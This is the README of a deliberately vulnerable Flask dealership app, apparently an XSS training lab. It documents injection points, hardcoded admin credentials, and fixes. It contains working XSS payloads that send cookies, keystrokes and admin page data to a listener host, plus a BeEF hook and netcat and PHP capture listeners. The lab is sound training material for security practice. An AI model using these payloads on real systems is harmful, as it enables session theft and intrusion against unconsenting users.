# AutoElite Motors — XSS Practice Lab

**Deliberately vulnerable car dealership for bug bounty and XSS practice.**

⚠️ **FOR LOCAL, AUTHORIZED PRACTICE ONLY.** The bugs below are intentional.  
Never deploy this outside a network you control.

---

## 🚀 Quick Start

```bash
# Install Flask
pip install flask

# Run the application
python app.py

# Access the site
# Browser: http://10.170.65.14:5000
```

**Admin Credentials:**
- Username: `admin`
- Password: `admin123`

---

## 🎯 What You'll Learn

This lab simulates a realistic car dealership website with **intentional XSS vulnerabilities** for practicing:

1. **Blind Stored XSS** — Contact form (triggers when admin views submission)
2. **Blind Stored XSS** — Feedback form (delayed execution in admin panel)
3. **Reflected XSS** — Search API endpoint
4. **Multiple injection points** — All form fields vulnerable

---

## 🏗️ Application Structure

```
autoelite-xss-lab/
├── app.py                      # Flask application (VULNERABLE)
├── README.md                   # This file
├── data/                       # JSON storage
│   ├── contacts.json          # Contact form submissions
│   └── feedback.json          # Feedback submissions
└── templates/                  # HTML templates (VULNERABLE)
    ├── base.html
    ├── home.html
    ├── car_detail.html
    ├── contact.html           # XSS sink #1
    ├── feedback.html          # XSS sink #2
    ├── thank_you.html
    ├── admin_login.html
    ├── admin_dashboard.html
    ├── view_contact.html      # XSS execution zone
    └── view_feedback.html     # XSS execution zone
```

---

## 🐛 Vulnerability Breakdown

### 1️⃣ Blind XSS in Contact Form

**Location:** `/contact`

**How it works:**
- User submits contact form with XSS payload
- Data stored without sanitization
- When admin views submission at `/admin/view-contact/<id>`, payload executes
- Templates use `|safe` filter which disables auto-escaping

**Vulnerable fields:**
- Name
- Email
- Phone
- Message

**Test payload:**
```html
<script>alert('Blind XSS in Contact Form!')</script>
```

**Attack flow:**
1. Go to http://10.170.65.14:5000/contact
2. Inject payload in any field
3. Submit form
4. Login to admin panel (admin/admin123)
5. Click "View Details" on your submission
6. Payload executes in admin's browser

---

### 2️⃣ Blind XSS in Feedback Form

**Location:** `/feedback`

**How it works:**
- Similar to contact form
- Feedback stored and rendered in admin panel
- Multiple injection points for testing

**Vulnerable fields:**
- Name
- Email
- Experience description
- Comments

**Test payload:**
```html
<img src=x onerror="alert('Feedback XSS!')">
```

**Cookie stealing payload:**
```html
<script>
fetch('http://YOUR_LISTENER:8080/steal?cookie=' + document.cookie);
</script>
```

---

### 3️⃣ Reflected XSS in Search API

**Location:** `/api/search?q=`

**How it works:**
- Query parameter reflected in JSON response
- No sanitization of user input

**Test URL:**
```
http://10.170.65.14:5000/api/search?q=<script>alert('Reflected XSS')</script>
```

---

## 🧪 Practice Exercises

### Beginner Level

**Exercise 1: Basic Alert Box**
1. Submit contact form with `<script>alert('XSS')</script>` in name field
2. Login as admin
3. View the contact to trigger alert

**Exercise 2: Image Tag XSS**
1. Use payload: `<img src=x onerror=alert('XSS')>`
2. Test in different fields
3. Verify which fields are vulnerable

---

### Intermediate Level

**Exercise 3: Cookie Exfiltration**

Set up listener:
```bash
# Terminal 1: Start listener
python -m http.server 8080
```

Payload:
```html
<script>
fetch('http://10.170.65.14:8080/steal?cookie=' + document.cookie);
</script>
```

**Exercise 4: DOM Manipulation**
```html
<script>
document.body.innerHTML = '<h1>Site Compromised</h1>';
</script>
```

**Exercise 5: Keylogger**
```html
<script>
document.onkeypress = function(e) {
    fetch('http://10.170.65.14:8080/log?key=' + e.key);
}
</script>
```

---

### Advanced Level

**Exercise 6: BeEF Hook Injection**
```html
<script src="http://YOUR_BEEF_SERVER:3000/hook.js"></script>
```

**Exercise 7: Session Hijacking**
```html
<script>
var img = new Image();
img.src = 'http://10.170.65.14:8080/hijack?session=' + document.cookie;
</script>
```

**Exercise 8: Admin Actions**
```html
<script>
// Fetch all contacts
fetch('/admin/dashboard')
    .then(r => r.text())
    .then(data => {
        // Exfiltrate admin data
        fetch('http://10.170.65.14:8080/exfil', {
            method: 'POST',
            body: data
        });
    });
</script>
```

---

## 🔍 Testing Methodology

### Phase 1: Reconnaissance
- [ ] Map all input fields
- [ ] Identify data display points
- [ ] Find API endpoints
- [ ] Locate admin functionality

### Phase 2: Basic Testing
- [ ] Test simple payloads: `<script>alert(1)</script>`
- [ ] Test image tags: `<img src=x onerror=alert(1)>`
- [ ] Test SVG: `<svg onload=alert(1)>`
- [ ] Test event handlers: `<body onload=alert(1)>`

### Phase 3: Blind XSS
- [ ] Set up listener server
- [ ] Submit payloads with callbacks
- [ ] Login as admin and trigger
- [ ] Monitor listener for callbacks

### Phase 4: Data Exfiltration
- [ ] Test cookie stealing
- [ ] Test session hijacking
- [ ] Test admin data extraction
- [ ] Test keylogging

---

## 📝 XSS Payload Cheat Sheet

### Basic Payloads
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
```

### Callback Payloads (for Blind XSS)
```html
<script src="http://10.170.65.14:8080/callback.js"></script>
<img src="http://10.170.65.14:8080/pixel.gif">
<script>document.location='http://10.170.65.14:8080/?c='+document.cookie</script>
```

### Event Handler Payloads
```html
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>
<details open ontoggle=alert('XSS')>
<marquee onstart=alert('XSS')>
```

### Encoding Variations
```html
<script>alert('XSS')</script>
<ScRiPt>alert('XSS')</ScRiPt>
<script>alert`XSS`</script>
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
```

---

## 🛠️ Setting Up a Listener

### Simple Python HTTP Server
```bash
python -m http.server 8080
# or with Python 2
python -m SimpleHTTPServer 8080
```

### Netcat Listener
```bash
nc -lvnp 8080
```

### PHP Listener (capture.php)
```php
<?php
file_put_contents('log.txt', print_r($_GET, true) . "\n", FILE_APPEND);
?>
```

---

## 🔒 How to Fix (After Practice)

### 1. Input Sanitization
```python
from markupsafe import escape

# Before (VULNERABLE)
contact_data = {'name': request.form.get('name', '')}

# After (SECURE)
contact_data = {'name': escape(request.form.get('name', ''))}
```

### 2. Output Encoding
```html
<!-- Before (VULNERABLE) -->
{{ contact.name|safe }}

<!-- After (SECURE) -->
{{ contact.name }}  
<!-- Jinja2 auto-escapes by default when |safe is removed -->
```

### 3. Content Security Policy
```python
@app.after_request
def set_security_headers(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    return response
```

### 4. HTTPOnly Cookies
```python
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
```

---

## 📚 Resources

### Learning Platforms
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) — Free XSS labs
- [OWASP XSS Guide](https://owasp.org/www-community/attacks/xss/)
- [HackerOne Hacktivity](https://hackerone.com/hacktivity) — Real bug bounty reports

### Payload Collections
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### Bug Bounty Platforms
- [HackerOne](https://hackerone.com)
- [Bugcrowd](https://bugcrowd.com)
- [Intigriti](https://intigriti.com)
- [YesWeHack](https://yeswehack.com)

---

## ⚠️ Legal & Ethical Notice

### ✅ ONLY test on:
- This practice lab
- Bug bounty programs you're authorized to test
- Your own applications
- CTF competitions and challenges

### ❌ NEVER test on:
- Production systems without permission
- Other people's websites
- Government or critical infrastructure
- Any system without explicit authorization

**Unauthorized testing is illegal and unethical.**

---

## 🎯 Success Checklist

- [ ] Successfully injected basic XSS payload
- [ ] Triggered blind XSS in admin panel
- [ ] Exfiltrated admin session cookie
- [ ] Set up working listener server
- [ ] Tested multiple injection points
- [ ] Practiced different payload types
- [ ] Documented findings in bug report format
- [ ] Understood how to fix the vulnerabilities

---

## 🤝 Next Steps

After mastering this lab:

1. **Practice on Legal Platforms**
   - Sign up for HackerOne
   - Complete PortSwigger Academy labs
   - Join CTF competitions

2. **Expand Your Skills**
   - Learn SQL Injection
   - Study CSRF attacks
   - Understand SSRF vulnerabilities
   - Master authentication bypasses

3. **Build Your Portfolio**
   - Document your findings
   - Write blog posts
   - Share knowledge with the community

---

## 📄 License

This project is for **educational purposes only**. Use responsibly and ethically.

---

**🚗 Happy Ethical Hacking!**

Server: http://10.170.65.14:5000  
Admin: admin / admin123
